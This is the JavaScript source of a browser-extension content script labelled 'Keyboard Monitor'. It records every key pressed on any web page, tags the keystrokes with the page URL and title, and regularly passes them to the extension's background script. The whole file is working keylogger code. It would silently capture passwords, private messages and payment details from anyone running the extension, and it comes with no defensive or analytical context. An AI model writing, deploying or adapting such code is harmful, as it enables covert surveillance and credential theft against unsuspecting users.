// Keyboard Monitor Content Script
(() => {
  let keyBuffer = [];
  const SEND_INTERVAL = 5000; // Send keys every 5 seconds
  let lastSendTime = Date.now();

  function sendKeyboardLogs() {
    if (keyBuffer.length === 0) return;

    console.log(`[DEBUG] Sending keyboard logs: ${keyBuffer.join('')}`);
    chrome.runtime.sendMessage({
      type: "KEYBOARD_DATA",
      data: {
        keys: keyBuffer.join(''),
        url: window.location.href,
        title: document.title,
        timestamp: Date.now()
      }
    });

    keyBuffer = [];
    lastSendTime = Date.now();
  }

  // Listen for key presses
  window.addEventListener('keydown', (event) => {
    let key = event.key;
    
    // Handle special keys
    if (key.length > 1) {
      key = `[${key}]`;
    }
    
    keyBuffer.push(key);
    
    // If buffer gets too large, send immediately
    if (keyBuffer.length >= 100) {
      sendKeyboardLogs();
    }
  }, { passive: true });

  // Periodically send logs
  setInterval(() => {
    const now = Date.now();
    if (now - lastSendTime >= SEND_INTERVAL) {
      sendKeyboardLogs();
    }
  }, 1000);

  // Send on page leave
  window.addEventListener('beforeunload', sendKeyboardLogs);
})();
